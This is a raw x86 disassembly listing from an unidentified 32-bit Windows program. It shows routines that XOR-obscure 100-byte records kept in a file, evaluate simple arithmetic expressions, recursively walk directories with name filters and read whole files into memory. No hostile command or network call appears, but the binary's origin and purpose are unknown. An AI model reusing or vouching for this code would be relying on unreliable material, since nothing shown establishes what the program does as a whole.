  407da2:	50                   	push   %eax
  407da3:	e8 69 d7 ff ff       	call   0x405511
  407da8:	83 c4 0c             	add    $0xc,%esp
  407dab:	6a 0a                	push   $0xa
  407dad:	59                   	pop    %ecx
  407dae:	3b f1                	cmp    %ecx,%esi
  407db0:	73 11                	jae    0x407dc3
  407db2:	2b ce                	sub    %esi,%ecx
  407db4:	33 c0                	xor    %eax,%eax
  407db6:	d1 e9                	shr    $1,%ecx
  407db8:	8d 7c 75 98          	lea    -0x68(%ebp,%esi,2),%edi
  407dbc:	f3 ab                	rep stos %eax,%es:(%edi)
  407dbe:	13 c9                	adc    %ecx,%ecx
  407dc0:	66 f3 ab             	rep stos %ax,%es:(%edi)
  407dc3:	8b 55 10             	mov    0x10(%ebp),%edx
  407dc6:	8d 45 ac             	lea    -0x54(%ebp),%eax
  407dc9:	50                   	push   %eax
  407dca:	e8 42 d7 ff ff       	call   0x405511
  407dcf:	59                   	pop    %ecx
  407dd0:	6a 32                	push   $0x32
  407dd2:	8d 43 0a             	lea    0xa(%ebx),%eax
  407dd5:	59                   	pop    %ecx
  407dd6:	3b c1                	cmp    %ecx,%eax
  407dd8:	73 11                	jae    0x407deb
  407dda:	2b c8                	sub    %eax,%ecx
  407ddc:	8d 7c 45 98          	lea    -0x68(%ebp,%eax,2),%edi
  407de0:	33 c0                	xor    %eax,%eax
  407de2:	d1 e9                	shr    $1,%ecx
  407de4:	f3 ab                	rep stos %eax,%es:(%edi)
  407de6:	13 c9                	adc    %ecx,%ecx
  407de8:	66 f3 ab             	rep stos %ax,%es:(%edi)
  407deb:	33 f6                	xor    %esi,%esi
  407ded:	33 c0                	xor    %eax,%eax
  407def:	80 74 05 98 78       	xorb   $0x78,-0x68(%ebp,%eax,1)
  407df4:	40                   	inc    %eax
  407df5:	83 f8 64             	cmp    $0x64,%eax
  407df8:	72 f5                	jb     0x407def
  407dfa:	8b 45 08             	mov    0x8(%ebp),%eax
  407dfd:	6b c0 64             	imul   $0x64,%eax,%eax
  407e00:	56                   	push   %esi
  407e01:	56                   	push   %esi
  407e02:	50                   	push   %eax
  407e03:	ff 35 b4 10 41 00    	push   0x4110b4
  407e09:	ff 15 88 e0 40 00    	call   *0x40e088
  407e0f:	56                   	push   %esi
  407e10:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407e13:	50                   	push   %eax
  407e14:	6a 64                	push   $0x64
  407e16:	8d 45 98             	lea    -0x68(%ebp),%eax
  407e19:	50                   	push   %eax
  407e1a:	ff 35 b4 10 41 00    	push   0x4110b4
  407e20:	ff 15 ec e0 40 00    	call   *0x40e0ec
  407e26:	5f                   	pop    %edi
  407e27:	5e                   	pop    %esi
  407e28:	5b                   	pop    %ebx
  407e29:	c9                   	leave
  407e2a:	c3                   	ret
  407e2b:	55                   	push   %ebp
  407e2c:	8b ec                	mov    %esp,%ebp
  407e2e:	83 ec 6c             	sub    $0x6c,%esp
  407e31:	83 3d b4 10 41 00 ff 	cmpl   $0xffffffff,0x4110b4
  407e38:	56                   	push   %esi
  407e39:	8b f0                	mov    %eax,%esi
  407e3b:	75 11                	jne    0x407e4e
  407e3d:	6a 01                	push   $0x1
  407e3f:	e8 93 fe ff ff       	call   0x407cd7
  407e44:	83 3d b4 10 41 00 ff 	cmpl   $0xffffffff,0x4110b4
  407e4b:	59                   	pop    %ecx
  407e4c:	74 6c                	je     0x407eba
  407e4e:	6b f6 64             	imul   $0x64,%esi,%esi
  407e51:	6a 00                	push   $0x0
  407e53:	6a 00                	push   $0x0
  407e55:	56                   	push   %esi
  407e56:	ff 35 b4 10 41 00    	push   0x4110b4
  407e5c:	ff 15 88 e0 40 00    	call   *0x40e088
  407e62:	6a 00                	push   $0x0
  407e64:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407e67:	50                   	push   %eax
  407e68:	6a 64                	push   $0x64
  407e6a:	8d 45 94             	lea    -0x6c(%ebp),%eax
  407e6d:	50                   	push   %eax
  407e6e:	ff 35 b4 10 41 00    	push   0x4110b4
  407e74:	ff 15 ac e0 40 00    	call   *0x40e0ac
  407e7a:	85 c0                	test   %eax,%eax
  407e7c:	74 3c                	je     0x407eba
  407e7e:	83 7d fc 64          	cmpl   $0x64,-0x4(%ebp)
  407e82:	75 36                	jne    0x407eba
  407e84:	33 c0                	xor    %eax,%eax
  407e86:	80 74 05 94 78       	xorb   $0x78,-0x6c(%ebp,%eax,1)
  407e8b:	40                   	inc    %eax
  407e8c:	83 f8 64             	cmp    $0x64,%eax
  407e8f:	72 f5                	jb     0x407e86
  407e91:	ff 75 08             	push   0x8(%ebp)
  407e94:	66 83 65 f8 00       	andw   $0x0,-0x8(%ebp)
  407e99:	8d 45 94             	lea    -0x6c(%ebp),%eax
  407e9c:	e8 f2 d5 ff ff       	call   0x405493
  407ea1:	59                   	pop    %ecx
  407ea2:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  407ea5:	3b c1                	cmp    %ecx,%eax
  407ea7:	75 11                	jne    0x407eba
  407ea9:	ff 75 0c             	push   0xc(%ebp)
  407eac:	8d 55 a8             	lea    -0x58(%ebp),%edx
  407eaf:	e8 5d d6 ff ff       	call   0x405511
  407eb4:	33 c0                	xor    %eax,%eax
  407eb6:	59                   	pop    %ecx
  407eb7:	40                   	inc    %eax
  407eb8:	eb 02                	jmp    0x407ebc
  407eba:	33 c0                	xor    %eax,%eax
  407ebc:	5e                   	pop    %esi
  407ebd:	c9                   	leave
  407ebe:	c3                   	ret
  407ebf:	53                   	push   %ebx
  407ec0:	56                   	push   %esi
  407ec1:	57                   	push   %edi
  407ec2:	8b 3d c8 7e 42 00    	mov    0x427ec8,%edi
  407ec8:	33 f6                	xor    %esi,%esi
  407eca:	85 ff                	test   %edi,%edi
  407ecc:	7e 1c                	jle    0x407eea
  407ece:	bb 10 18 41 00       	mov    $0x411810,%ebx
  407ed3:	8b 44 24 10          	mov    0x10(%esp),%eax
  407ed7:	8b d3                	mov    %ebx,%edx
  407ed9:	e8 89 d5 ff ff       	call   0x405467
  407ede:	85 c0                	test   %eax,%eax
  407ee0:	74 10                	je     0x407ef2
  407ee2:	46                   	inc    %esi
  407ee3:	83 c3 20             	add    $0x20,%ebx
  407ee6:	3b f7                	cmp    %edi,%esi
  407ee8:	7c e9                	jl     0x407ed3
  407eea:	33 c0                	xor    %eax,%eax
  407eec:	33 d2                	xor    %edx,%edx
  407eee:	5f                   	pop    %edi
  407eef:	5e                   	pop    %esi
  407ef0:	5b                   	pop    %ebx
  407ef1:	c3                   	ret
  407ef2:	c1 e6 05             	shl    $0x5,%esi
  407ef5:	8b 86 28 18 41 00    	mov    0x411828(%esi),%eax
  407efb:	8b 96 2c 18 41 00    	mov    0x41182c(%esi),%edx
  407f01:	eb eb                	jmp    0x407eee
  407f03:	8b 0d c4 3e 42 00    	mov    0x423ec4,%ecx
  407f09:	85 c9                	test   %ecx,%ecx
  407f0b:	7e 16                	jle    0x407f23
  407f0d:	8b 04 cd e0 14 41 00 	mov    0x4114e0(,%ecx,8),%eax
  407f14:	8b 14 cd e4 14 41 00 	mov    0x4114e4(,%ecx,8),%edx
  407f1b:	49                   	dec    %ecx
  407f1c:	89 0d c4 3e 42 00    	mov    %ecx,0x423ec4
  407f22:	c3                   	ret
  407f23:	33 c0                	xor    %eax,%eax
  407f25:	33 d2                	xor    %edx,%edx
  407f27:	c3                   	ret
  407f28:	a1 c4 3e 42 00       	mov    0x423ec4,%eax
  407f2d:	83 f8 64             	cmp    $0x64,%eax
  407f30:	7d 1c                	jge    0x407f4e
  407f32:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407f36:	89 0c c5 e8 14 41 00 	mov    %ecx,0x4114e8(,%eax,8)
  407f3d:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  407f41:	89 0c c5 ec 14 41 00 	mov    %ecx,0x4114ec(,%eax,8)
  407f48:	40                   	inc    %eax
  407f49:	a3 c4 3e 42 00       	mov    %eax,0x423ec4
  407f4e:	c3                   	ret
  407f4f:	55                   	push   %ebp
  407f50:	8b ec                	mov    %esp,%ebp
  407f52:	b8 4c 15 00 00       	mov    $0x154c,%eax
  407f57:	e8 54 56 00 00       	call   0x40d5b0
  407f5c:	53                   	push   %ebx
  407f5d:	56                   	push   %esi
  407f5e:	8b f1                	mov    %ecx,%esi
  407f60:	57                   	push   %edi
  407f61:	b8 ec eb 40 00       	mov    $0x40ebec,%eax
  407f66:	8b d6                	mov    %esi,%edx
  407f68:	e8 fa d4 ff ff       	call   0x405467
  407f6d:	85 c0                	test   %eax,%eax
  407f6f:	75 0b                	jne    0x407f7c
  407f71:	e8 d7 d8 ff ff       	call   0x40584d
  407f76:	99                   	cltd
  407f77:	e9 10 01 00 00       	jmp    0x40808c
  407f7c:	68 f8 eb 40 00       	push   $0x40ebf8
  407f81:	8b c6                	mov    %esi,%eax
  407f83:	e8 0b d5 ff ff       	call   0x405493
  407f88:	3b c6                	cmp    %esi,%eax
  407f8a:	59                   	pop    %ecx
  407f8b:	75 45                	jne    0x407fd2
  407f8d:	8d 85 b8 ea ff ff    	lea    -0x1548(%ebp),%eax
  407f93:	8d 56 0a             	lea    0xa(%esi),%edx
  407f96:	50                   	push   %eax
  407f97:	e8 75 d5 ff ff       	call   0x405511
  407f9c:	59                   	pop    %ecx
  407f9d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407fa0:	50                   	push   %eax
  407fa1:	6a 7c                	push   $0x7c
  407fa3:	6a 3a                	push   $0x3a
  407fa5:	8d 85 b8 fa ff ff    	lea    -0x548(%ebp),%eax
  407fab:	50                   	push   %eax
  407fac:	8d 85 b8 ea ff ff    	lea    -0x1548(%ebp),%eax
  407fb2:	50                   	push   %eax
  407fb3:	e8 43 d9 ff ff       	call   0x4058fb
  407fb8:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  407fbb:	8b 85 b8 fa ff ff    	mov    -0x548(%ebp),%eax
  407fc1:	83 c4 14             	add    $0x14,%esp
  407fc4:	4b                   	dec    %ebx
  407fc5:	8d bd bc fa ff ff    	lea    -0x544(%ebp),%edi
  407fcb:	e8 a3 f5 ff ff       	call   0x407573
  407fd0:	eb a4                	jmp    0x407f76
  407fd2:	68 04 ec 40 00       	push   $0x40ec04
  407fd7:	8b c6                	mov    %esi,%eax
  407fd9:	e8 b5 d4 ff ff       	call   0x405493
  407fde:	3b c6                	cmp    %esi,%eax
  407fe0:	59                   	pop    %ecx
  407fe1:	75 6e                	jne    0x408051
  407fe3:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  407fe9:	8d 56 0c             	lea    0xc(%esi),%edx
  407fec:	50                   	push   %eax
  407fed:	e8 1f d5 ff ff       	call   0x405511
  407ff2:	59                   	pop    %ecx
  407ff3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407ff6:	50                   	push   %eax
  407ff7:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  407ffa:	6a 3a                	push   $0x3a
  407ffc:	50                   	push   %eax
  407ffd:	66 bf 7c 00          	mov    $0x7c,%di
  408001:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  408007:	e8 5f d8 ff ff       	call   0x40586b
  40800c:	83 c4 0c             	add    $0xc,%esp
  40800f:	e8 ef fe ff ff       	call   0x407f03
  408014:	83 3d c8 7e 42 00 0a 	cmpl   $0xa,0x427ec8
  40801b:	8b f0                	mov    %eax,%esi
  40801d:	8b fa                	mov    %edx,%edi
  40801f:	7d 2a                	jge    0x40804b
  408021:	a1 c8 7e 42 00       	mov    0x427ec8,%eax
  408026:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  408029:	c1 e0 05             	shl    $0x5,%eax
  40802c:	89 b0 28 18 41 00    	mov    %esi,0x411828(%eax)
  408032:	89 b8 2c 18 41 00    	mov    %edi,0x41182c(%eax)
  408038:	8d 80 10 18 41 00    	lea    0x411810(%eax),%eax
  40803e:	50                   	push   %eax
  40803f:	e8 cd d4 ff ff       	call   0x405511
  408044:	ff 05 c8 7e 42 00    	incl   0x427ec8
  40804a:	59                   	pop    %ecx
  40804b:	8b c6                	mov    %esi,%eax
  40804d:	8b d7                	mov    %edi,%edx
  40804f:	eb 3b                	jmp    0x40808c
  408051:	b8 14 ec 40 00       	mov    $0x40ec14,%eax
  408056:	8b d6                	mov    %esi,%edx
  408058:	e8 0a d4 ff ff       	call   0x405467
  40805d:	85 c0                	test   %eax,%eax
  40805f:	75 07                	jne    0x408068
  408061:	e8 87 f2 ff ff       	call   0x4072ed
  408066:	eb 24                	jmp    0x40808c
  408068:	b8 28 ec 40 00       	mov    $0x40ec28,%eax
  40806d:	8b d6                	mov    %esi,%edx
  40806f:	e8 f3 d3 ff ff       	call   0x405467
  408074:	85 c0                	test   %eax,%eax
  408076:	75 0d                	jne    0x408085
  408078:	a1 08 18 41 00       	mov    0x411808,%eax
  40807d:	8b 15 0c 18 41 00    	mov    0x41180c,%edx
  408083:	eb 07                	jmp    0x40808c
  408085:	56                   	push   %esi
  408086:	e8 34 fe ff ff       	call   0x407ebf
  40808b:	59                   	pop    %ecx
  40808c:	5f                   	pop    %edi
  40808d:	5e                   	pop    %esi
  40808e:	5b                   	pop    %ebx
  40808f:	c9                   	leave
  408090:	c3                   	ret
  408091:	55                   	push   %ebp
  408092:	8b ec                	mov    %esp,%ebp
  408094:	b8 0c 10 00 00       	mov    $0x100c,%eax
  408099:	e8 12 55 00 00       	call   0x40d5b0
  40809e:	83 25 c4 3e 42 00 00 	andl   $0x0,0x423ec4
  4080a5:	53                   	push   %ebx
  4080a6:	56                   	push   %esi
  4080a7:	57                   	push   %edi
  4080a8:	8b f9                	mov    %ecx,%edi
  4080aa:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
  4080b0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4080b3:	0f b7 07             	movzwl (%edi),%eax
  4080b6:	33 f6                	xor    %esi,%esi
  4080b8:	66 85 c0             	test   %ax,%ax
  4080bb:	74 32                	je     0x4080ef
  4080bd:	0f b7 c0             	movzwl %ax,%eax
  4080c0:	e8 f6 d4 ff ff       	call   0x4055bb
  4080c5:	85 c0                	test   %eax,%eax
  4080c7:	74 26                	je     0x4080ef
  4080c9:	47                   	inc    %edi
  4080ca:	47                   	inc    %edi
  4080cb:	0f b7 07             	movzwl (%edi),%eax
  4080ce:	66 85 c0             	test   %ax,%ax
  4080d1:	75 ed                	jne    0x4080c0
  4080d3:	eb 1a                	jmp    0x4080ef
  4080d5:	8b c3                	mov    %ebx,%eax
  4080d7:	e8 df d4 ff ff       	call   0x4055bb
  4080dc:	85 c0                	test   %eax,%eax
  4080de:	75 17                	jne    0x4080f7
  4080e0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4080e3:	83 45 fc 02          	addl   $0x2,-0x4(%ebp)
  4080e7:	47                   	inc    %edi
  4080e8:	33 f6                	xor    %esi,%esi
  4080ea:	47                   	inc    %edi
  4080eb:	66 89 18             	mov    %bx,(%eax)
  4080ee:	46                   	inc    %esi
  4080ef:	0f b7 1f             	movzwl (%edi),%ebx
  4080f2:	66 85 db             	test   %bx,%bx
  4080f5:	75 de                	jne    0x4080d5
  4080f7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4080fa:	66 83 20 00          	andw   $0x0,(%eax)
  4080fe:	f7 de                	neg    %esi
  408100:	1b f6                	sbb    %esi,%esi
  408102:	23 f7                	and    %edi,%esi
  408104:	8b fe                	mov    %esi,%edi
  408106:	0f 84 06 01 00 00    	je     0x408212
  40810c:	0f b7 85 f8 ef ff ff 	movzwl -0x1008(%ebp),%eax
  408113:	83 e8 25             	sub    $0x25,%eax
  408116:	0f 84 d1 00 00 00    	je     0x4081ed
  40811c:	83 e8 05             	sub    $0x5,%eax
  40811f:	0f 84 af 00 00 00    	je     0x4081d4
  408125:	48                   	dec    %eax
  408126:	0f 84 92 00 00 00    	je     0x4081be
  40812c:	6a 02                	push   $0x2
  40812e:	5a                   	pop    %edx
  40812f:	2b c2                	sub    %edx,%eax
  408131:	74 77                	je     0x4081aa
  408133:	2b c2                	sub    %edx,%eax
  408135:	74 5a                	je     0x408191
  408137:	83 e8 0e             	sub    $0xe,%eax
  40813a:	0f 84 d2 00 00 00    	je     0x408212
  408140:	66 83 bd f8 ef ff ff 	cmpw   $0x2d,-0x1008(%ebp)
  408147:	2d 
  408148:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
  40814e:	75 06                	jne    0x408156
  408150:	8d 85 fa ef ff ff    	lea    -0x1006(%ebp),%eax
  408156:	66 83 38 2b          	cmpw   $0x2b,(%eax)
  40815a:	75 10                	jne    0x40816c
  40815c:	eb 0c                	jmp    0x40816a
  40815e:	66 83 f9 30          	cmp    $0x30,%cx
  408162:	72 20                	jb     0x408184
  408164:	66 83 f9 39          	cmp    $0x39,%cx
  408168:	77 1a                	ja     0x408184
  40816a:	03 c2                	add    %edx,%eax
  40816c:	0f b7 08             	movzwl (%eax),%ecx
  40816f:	66 85 c9             	test   %cx,%cx
  408172:	75 ea                	jne    0x40815e
  408174:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
  40817a:	e8 ff d4 ff ff       	call   0x40567e
  40817f:	e9 80 00 00 00       	jmp    0x408204
  408184:	8d 8d f8 ef ff ff    	lea    -0x1008(%ebp),%ecx
  40818a:	e8 c0 fd ff ff       	call   0x407f4f
  40818f:	eb 73                	jmp    0x408204
  408191:	e8 6d fd ff ff       	call   0x407f03
  408196:	8b f0                	mov    %eax,%esi
  408198:	8b da                	mov    %edx,%ebx
  40819a:	e8 64 fd ff ff       	call   0x407f03
  40819f:	53                   	push   %ebx
  4081a0:	56                   	push   %esi
  4081a1:	52                   	push   %edx
  4081a2:	50                   	push   %eax
  4081a3:	e8 28 52 00 00       	call   0x40d3d0
  4081a8:	eb 5a                	jmp    0x408204
  4081aa:	e8 54 fd ff ff       	call   0x407f03
  4081af:	8b f0                	mov    %eax,%esi
  4081b1:	8b da                	mov    %edx,%ebx
  4081b3:	e8 4b fd ff ff       	call   0x407f03
  4081b8:	2b f0                	sub    %eax,%esi
  4081ba:	1b da                	sbb    %edx,%ebx
  4081bc:	eb 12                	jmp    0x4081d0
  4081be:	e8 40 fd ff ff       	call   0x407f03
  4081c3:	8b f0                	mov    %eax,%esi
  4081c5:	8b da                	mov    %edx,%ebx
  4081c7:	e8 37 fd ff ff       	call   0x407f03
  4081cc:	03 f0                	add    %eax,%esi
  4081ce:	13 da                	adc    %edx,%ebx
  4081d0:	53                   	push   %ebx
  4081d1:	56                   	push   %esi
  4081d2:	eb 32                	jmp    0x408206
  4081d4:	e8 2a fd ff ff       	call   0x407f03
  4081d9:	8b f0                	mov    %eax,%esi
  4081db:	8b da                	mov    %edx,%ebx
  4081dd:	e8 21 fd ff ff       	call   0x407f03
  4081e2:	52                   	push   %edx
  4081e3:	50                   	push   %eax
  4081e4:	53                   	push   %ebx
  4081e5:	56                   	push   %esi
  4081e6:	e8 05 53 00 00       	call   0x40d4f0
  4081eb:	eb 17                	jmp    0x408204
  4081ed:	e8 11 fd ff ff       	call   0x407f03
  4081f2:	8b f0                	mov    %eax,%esi
  4081f4:	8b da                	mov    %edx,%ebx
  4081f6:	e8 08 fd ff ff       	call   0x407f03
  4081fb:	53                   	push   %ebx
  4081fc:	56                   	push   %esi
  4081fd:	52                   	push   %edx
  4081fe:	50                   	push   %eax
  4081ff:	e8 dc 53 00 00       	call   0x40d5e0
  408204:	52                   	push   %edx
  408205:	50                   	push   %eax
  408206:	e8 1d fd ff ff       	call   0x407f28
  40820b:	59                   	pop    %ecx
  40820c:	59                   	pop    %ecx
  40820d:	e9 98 fe ff ff       	jmp    0x4080aa
  408212:	e8 ec fc ff ff       	call   0x407f03
  408217:	5f                   	pop    %edi
  408218:	5e                   	pop    %esi
  408219:	5b                   	pop    %ebx
  40821a:	c9                   	leave
  40821b:	c3                   	ret
  40821c:	85 c0                	test   %eax,%eax
  40821e:	74 13                	je     0x408233
  408220:	0f b7 08             	movzwl (%eax),%ecx
  408223:	66 83 f9 5c          	cmp    $0x5c,%cx
  408227:	74 06                	je     0x40822f
  408229:	66 83 f9 2f          	cmp    $0x2f,%cx
  40822d:	75 04                	jne    0x408233
  40822f:	40                   	inc    %eax
  408230:	40                   	inc    %eax
  408231:	eb ed                	jmp    0x408220
  408233:	50                   	push   %eax
  408234:	ff 74 24 0c          	push   0xc(%esp)
  408238:	ff 74 24 0c          	push   0xc(%esp)
  40823c:	ff 15 24 e1 40 00    	call   *0x40e124
  408242:	85 c0                	test   %eax,%eax
  408244:	0f 95 c0             	setne  %al
  408247:	c3                   	ret
  408248:	55                   	push   %ebp
  408249:	8b ec                	mov    %esp,%ebp
  40824b:	81 ec 68 04 00 00    	sub    $0x468,%esp
  408251:	53                   	push   %ebx
  408252:	56                   	push   %esi
  408253:	57                   	push   %edi
  408254:	ff 75 08             	push   0x8(%ebp)
  408257:	8d 85 9c fb ff ff    	lea    -0x464(%ebp),%eax
  40825d:	50                   	push   %eax
  40825e:	b8 40 ec 40 00       	mov    $0x40ec40,%eax
  408263:	e8 b4 ff ff ff       	call   0x40821c
  408268:	84 c0                	test   %al,%al
  40826a:	59                   	pop    %ecx
  40826b:	59                   	pop    %ecx
  40826c:	0f 84 4d 01 00 00    	je     0x4083bf
  408272:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  408278:	50                   	push   %eax
  408279:	8d 85 9c fb ff ff    	lea    -0x464(%ebp),%eax
  40827f:	50                   	push   %eax
  408280:	ff 15 84 e0 40 00    	call   *0x40e084
  408286:	83 f8 ff             	cmp    $0xffffffff,%eax
  408289:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40828c:	0f 84 2d 01 00 00    	je     0x4083bf
  408292:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408295:	8b 1d 70 e0 40 00    	mov    0x40e070,%ebx
  40829b:	33 f6                	xor    %esi,%esi
  40829d:	39 75 20             	cmp    %esi,0x20(%ebp)
  4082a0:	74 15                	je     0x4082b7
  4082a2:	56                   	push   %esi
  4082a3:	ff 75 20             	push   0x20(%ebp)
  4082a6:	ff 15 b8 e0 40 00    	call   *0x40e0b8
  4082ac:	3d 02 01 00 00       	cmp    $0x102,%eax
  4082b1:	0f 85 ff 00 00 00    	jne    0x4083b6
  4082b7:	66 83 bd d0 fd ff ff 	cmpw   $0x2e,-0x230(%ebp)
  4082be:	2e 
  4082bf:	75 24                	jne    0x4082e5
  4082c1:	66 39 b5 d2 fd ff ff 	cmp    %si,-0x22e(%ebp)
  4082c8:	0f 84 d0 00 00 00    	je     0x40839e
  4082ce:	66 83 bd d2 fd ff ff 	cmpw   $0x2e,-0x22e(%ebp)
  4082d5:	2e 
  4082d6:	75 0d                	jne    0x4082e5
  4082d8:	66 39 b5 d4 fd ff ff 	cmp    %si,-0x22c(%ebp)
  4082df:	0f 84 b9 00 00 00    	je     0x40839e
  4082e5:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  4082eb:	83 e0 10             	and    $0x10,%eax
  4082ee:	74 06                	je     0x4082f6
  4082f0:	f6 45 14 02          	testb  $0x2,0x14(%ebp)
  4082f4:	75 0a                	jne    0x408300
  4082f6:	3b c6                	cmp    %esi,%eax
  4082f8:	75 4a                	jne    0x408344
  4082fa:	f6 45 14 04          	testb  $0x4,0x14(%ebp)
  4082fe:	74 44                	je     0x408344
  408300:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  408304:	76 3e                	jbe    0x408344
  408306:	ff 34 b7             	push   (%edi,%esi,4)
  408309:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40830f:	50                   	push   %eax
  408310:	ff 15 20 e1 40 00    	call   *0x40e120
  408316:	85 c0                	test   %eax,%eax
  408318:	75 08                	jne    0x408322
  40831a:	46                   	inc    %esi
  40831b:	3b 75 10             	cmp    0x10(%ebp),%esi
  40831e:	72 e6                	jb     0x408306
  408320:	eb 22                	jmp    0x408344
  408322:	ff 75 1c             	push   0x1c(%ebp)
  408325:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  40832b:	50                   	push   %eax
  40832c:	ff 75 08             	push   0x8(%ebp)
  40832f:	ff 55 18             	call   *0x18(%ebp)
  408332:	83 c4 0c             	add    $0xc,%esp
  408335:	84 c0                	test   %al,%al
  408337:	74 7d                	je     0x4083b6
  408339:	83 7d 28 00          	cmpl   $0x0,0x28(%ebp)
  40833d:	74 05                	je     0x408344
  40833f:	ff 75 28             	push   0x28(%ebp)
  408342:	ff d3                	call   *%ebx
  408344:	f6 85 a4 fd ff ff 10 	testb  $0x10,-0x25c(%ebp)
  40834b:	74 51                	je     0x40839e
  40834d:	f6 45 14 01          	testb  $0x1,0x14(%ebp)
  408351:	74 4b                	je     0x40839e
  408353:	ff 75 08             	push   0x8(%ebp)
  408356:	8d 85 9c fb ff ff    	lea    -0x464(%ebp),%eax
  40835c:	50                   	push   %eax
  40835d:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  408363:	e8 b4 fe ff ff       	call   0x40821c
  408368:	84 c0                	test   %al,%al
  40836a:	59                   	pop    %ecx
  40836b:	59                   	pop    %ecx
  40836c:	74 30                	je     0x40839e
  40836e:	83 7d 24 00          	cmpl   $0x0,0x24(%ebp)
  408372:	74 05                	je     0x408379
  408374:	ff 75 24             	push   0x24(%ebp)
  408377:	ff d3                	call   *%ebx
  408379:	ff 75 28             	push   0x28(%ebp)
  40837c:	8d 85 9c fb ff ff    	lea    -0x464(%ebp),%eax
  408382:	ff 75 24             	push   0x24(%ebp)
  408385:	ff 75 20             	push   0x20(%ebp)
  408388:	ff 75 1c             	push   0x1c(%ebp)
  40838b:	ff 75 18             	push   0x18(%ebp)
  40838e:	ff 75 14             	push   0x14(%ebp)
  408391:	ff 75 10             	push   0x10(%ebp)
  408394:	57                   	push   %edi
  408395:	50                   	push   %eax
  408396:	e8 ad fe ff ff       	call   0x408248
  40839b:	83 c4 24             	add    $0x24,%esp
  40839e:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4083a4:	50                   	push   %eax
  4083a5:	ff 75 f8             	push   -0x8(%ebp)
  4083a8:	ff 15 a4 e0 40 00    	call   *0x40e0a4
  4083ae:	85 c0                	test   %eax,%eax
  4083b0:	0f 85 e5 fe ff ff    	jne    0x40829b
  4083b6:	ff 75 f8             	push   -0x8(%ebp)
  4083b9:	ff 15 e8 e0 40 00    	call   *0x40e0e8
  4083bf:	5f                   	pop    %edi
  4083c0:	5e                   	pop    %esi
  4083c1:	5b                   	pop    %ebx
  4083c2:	c9                   	leave
  4083c3:	c3                   	ret
  4083c4:	55                   	push   %ebp
  4083c5:	8b ec                	mov    %esp,%ebp
  4083c7:	83 ec 0c             	sub    $0xc,%esp
  4083ca:	57                   	push   %edi
  4083cb:	33 ff                	xor    %edi,%edi
  4083cd:	57                   	push   %edi
  4083ce:	57                   	push   %edi
  4083cf:	6a 03                	push   $0x3
  4083d1:	57                   	push   %edi
  4083d2:	6a 07                	push   $0x7
  4083d4:	68 00 00 00 80       	push   $0x80000000
  4083d9:	ff 75 08             	push   0x8(%ebp)
  4083dc:	ff 15 c0 e0 40 00    	call   *0x40e0c0
  4083e2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4083e5:	89 46 08             	mov    %eax,0x8(%esi)
  4083e8:	74 6e                	je     0x408458
  4083ea:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4083ed:	51                   	push   %ecx
  4083ee:	50                   	push   %eax
  4083ef:	ff 15 c8 e0 40 00    	call   *0x40e0c8
  4083f5:	85 c0                	test   %eax,%eax
  4083f7:	74 56                	je     0x40844f
  4083f9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  4083fc:	75 51                	jne    0x40844f
  4083fe:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408401:	3b c7                	cmp    %edi,%eax
  408403:	89 46 04             	mov    %eax,0x4(%esi)
  408406:	75 06                	jne    0x40840e
  408408:	89 3e                	mov    %edi,(%esi)
  40840a:	b0 01                	mov    $0x1,%al
  40840c:	eb 4c                	jmp    0x40845a
  40840e:	6a 04                	push   $0x4
  408410:	68 00 30 00 00       	push   $0x3000
  408415:	50                   	push   %eax
  408416:	57                   	push   %edi
  408417:	ff 15 d8 e0 40 00    	call   *0x40e0d8
  40841d:	3b c7                	cmp    %edi,%eax
  40841f:	89 06                	mov    %eax,(%esi)
  408421:	74 2c                	je     0x40844f
  408423:	57                   	push   %edi
  408424:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  408427:	51                   	push   %ecx
  408428:	ff 76 04             	push   0x4(%esi)
  40842b:	50                   	push   %eax
  40842c:	ff 76 08             	push   0x8(%esi)
  40842f:	ff 15 ac e0 40 00    	call   *0x40e0ac
  408435:	85 c0                	test   %eax,%eax
  408437:	74 08                	je     0x408441
  408439:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40843c:	3b 46 04             	cmp    0x4(%esi),%eax
  40843f:	74 c9                	je     0x40840a
  408441:	68 00 80 00 00       	push   $0x8000
  408446:	57                   	push   %edi
  408447:	ff 36                	push   (%esi)
  408449:	ff 15 cc e0 40 00    	call   *0x40e0cc
  40844f:	ff 76 08             	push   0x8(%esi)
  408452:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  408458:	32 c0                	xor    %al,%al
  40845a:	5f                   	pop    %edi
  40845b:	c9                   	leave
  40845c:	c3                   	ret
  40845d:	55                   	push   %ebp
  40845e:	8b ec                	mov    %esp,%ebp
  408460:	57                   	push   %edi
  408461:	8d 45 14             	lea    0x14(%ebp),%eax
  408464:	50                   	push   %eax
  408465:	ff 75 10             	push   0x10(%ebp)
